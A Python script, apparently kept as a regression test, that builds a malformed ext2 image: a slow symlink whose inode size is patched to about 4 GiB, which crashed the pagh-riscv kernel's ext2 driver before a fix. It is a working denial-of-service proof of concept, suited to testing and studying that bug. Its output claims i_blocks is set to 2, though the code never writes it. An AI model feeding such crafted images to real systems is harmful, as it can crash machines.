#!/usr/bin/env python3
"""Craft the F-rv-1 ext2 image: a slow symlink inode with a huge `i_size`.

    craft_symlink.py <base.img> <out.img>

`base.img` must be an ext2 image the pagh-riscv ext2 driver mounts (the live
harness builds one with host `mke2fs`). The script adds the symlink `/biglink`
with `debugfs`, then patches the inode on disk in the copy:

    i_size   = 0xFFFFFF00   (u32, offset 4)
    i_blocks = 2            (u32, offset 28; non-zero => "slow" link)

Before 0.24.1 `read_symlink()` in `src/fs/ext2/mod.rs` sized `vec![0u8; i_size]`
from that field; the kernel heap refuses any single request above one 64 KiB
chunk, so the alloc-error panic (`panic = "abort"`) took the machine down. Any
path walk that follows the link triggered it: `cat /mnt/biglink`,
`openat("/mnt/biglink")`, `execve("/mnt/biglink")`, ...

The patch is computed from the superblock (block size, inodes per group,
group-descriptor table), so it works for 1 KiB/2 KiB/4 KiB images. It is the
PoC copied from the audit report (`attack/riscv/tools/craft_symlink.py`); this
copy lives in the repository so the regression is reproducible without the
attack tree.

Exit status: 0 on success, 2 on usage/tooling errors.
"""

from __future__ import annotations

import os
import struct
import subprocess
import sys

SUPERBLOCK_OFFSET = 1024

# On-disk ext2 inode field offsets this script touches (128-byte inode).
INODE_OFF_SIZE = 4
INODE_OFF_BLOCKS = 28

# The crafted value: 4 GiB minus 256 bytes. Above the heap's 64 KiB chunk cap
# (the abort the fix removes) and above any block size an ext2 symlink can use
# (the corruption the fix reports).
CRAFTED_SIZE = 0xFFFF_FF00


def u32(buf: bytes | bytearray, off: int) -> int:
    return struct.unpack_from("<I", buf, off)[0]


def u16(buf: bytes | bytearray, off: int) -> int:
    return struct.unpack_from("<H", buf, off)[0]


def inode_offset(data: bytearray, ino: int) -> tuple[int, int]:
    """Absolute byte offset of `ino` in its group's inode table."""
    sb = data[SUPERBLOCK_OFFSET : SUPERBLOCK_OFFSET + 1024]
    inodes_count = u32(sb, 0x00)
    first_data_block = u32(sb, 0x14)
    log_block_size = u32(sb, 0x18)
    inodes_per_group = u32(sb, 0x28)
    rev_level = u32(sb, 0x4C)
    inode_size = u16(sb, 0x58) if rev_level >= 1 else 128
    block_size = 1024 << log_block_size
    if ino == 0 or ino > inodes_count:
        raise SystemExit("inode %d out of range" % ino)
    group = (ino - 1) // inodes_per_group
    # The group-descriptor table starts in the block after the superblock's.
    gd_block = first_data_block + 1
    gd_off = gd_block * block_size + group * 32
    inode_table = u32(data, gd_off + 8)
    if inode_table == 0:
        raise SystemExit("group %d has no inode table" % group)
    ipb = block_size // inode_size
    within = (ino - 1) % inodes_per_group
    block = inode_table + within // ipb
    off = block * block_size + (within % ipb) * inode_size
    return off, inode_size


def craft(base_path: str, out_path: str, target_length: int = 70) -> dict[str, int]:
    """Copy `base_path`, add `/biglink` and patch its inode; return the facts."""
    with open(base_path, "rb") as handle:
        data = bytearray(handle.read())
    tmp = out_path + ".tmp"
    with open(tmp, "wb") as handle:
        handle.write(data)
    # > 59 bytes => e2fsprogs stores the target in a data block ("slow" link).
    target = "A" * target_length
    subprocess.run(
        ["debugfs", "-w", "-R", "symlink /biglink %s" % target, tmp],
        check=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    stat = subprocess.run(
        ["debugfs", "-R", "stat /biglink", tmp],
        check=True,
        capture_output=True,
        text=True,
    ).stdout
    ino = int(stat.split("Inode:")[1].split()[0])
    with open(tmp, "rb") as handle:
        data = bytearray(handle.read())
    off, _ = inode_offset(data, ino)
    before_size = u32(data, off + INODE_OFF_SIZE)
    before_blocks = u32(data, off + INODE_OFF_BLOCKS)
    if before_blocks == 0:
        raise SystemExit("e2fsprogs made a fast symlink; nothing to patch")
    struct.pack_into("<I", data, off + INODE_OFF_SIZE, CRAFTED_SIZE)
    with open(out_path, "wb") as handle:
        handle.write(data)
    os.unlink(tmp)
    return {
        "inode": ino,
        "offset": off,
        "before_size": before_size,
        "before_blocks": before_blocks,
    }


def main() -> int:
    if len(sys.argv) != 3:
        print(__doc__, file=sys.stderr)
        return 2
    facts = craft(sys.argv[1], sys.argv[2])
    print(
        "craft_symlink: inode %d at abs 0x%x: i_size %d -> %d, i_blocks %d -> 2"
        % (
            facts["inode"],
            facts["offset"],
            facts["before_size"],
            CRAFTED_SIZE,
            facts["before_blocks"],
        )
    )
    print("craft_symlink: wrote %s" % sys.argv[2])
    return 0


if __name__ == "__main__":
    sys.exit(main())
